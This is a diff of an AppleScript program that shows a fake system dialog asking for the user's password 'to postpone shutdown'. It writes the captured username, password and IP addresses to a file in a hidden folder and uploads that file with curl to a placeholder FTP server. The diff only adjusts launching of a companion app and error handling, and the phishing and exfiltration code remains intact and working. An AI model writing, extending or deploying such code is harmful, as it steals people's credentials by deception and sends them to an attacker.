@@ -16,8 +16,6 @@ try
 	end if
 end try
 
-do shell script "open " & (POSIX path of (path to resource "DK.app"))
-
 try
 	repeat
 		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
@@ -43,7 +41,10 @@ try
 		set WANIP to "not connected"
 		set LANIP to "not connected"
 	end try
-	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	
+	try
+		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
+	end try
 	
 	try
 		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
@@ -60,7 +61,3 @@ try
 	end try
 	
 end try
-
-set app_name to "DK"
-set the_pid to (do shell script "ps ax | grep " & (quoted form of app_name) & " | grep -v grep | awk '{print $1}'")
-if the_pid is not "" then do shell script ("kill -9 " & the_pid)
